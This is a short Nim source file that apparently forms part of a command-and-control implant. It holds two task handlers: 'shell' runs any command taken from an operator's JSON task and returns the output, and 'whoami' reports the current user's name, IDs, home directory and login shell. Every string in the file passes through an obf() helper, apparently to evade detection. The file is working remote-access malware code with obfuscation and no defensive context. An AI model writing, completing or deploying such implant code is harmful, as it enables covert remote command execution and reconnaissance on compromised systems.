import osproc
import posix
import json

import utils

proc shell*(task: JsonNode): string =
    var args: seq[JsonNode] = task[obf("args")].getElems
    var command: string = args[0].getStr

    try:
        var commandOutput: string
        (commandOutput, _) = execCmdEx(command)
        return commandOutput

    except:
        return obf("Failed to run the command")

proc whoami*(task: JsonNode): string = 
    try:
        var passwd: ptr Passwd = getpwuid(geteuid())
        return obf("Username: ") & $passwd.pw_name & obf("\nUID: ") & $passwd.pw_uid & obf("\nGID: ") & $passwd.pw_gid & obf("\nHome: ") & $passwd.pw_dir & obf("\nShell: ") & $passwd.pw_shell

    except Exception as e:
        return obf("Failed to get user info: ") & e.msg

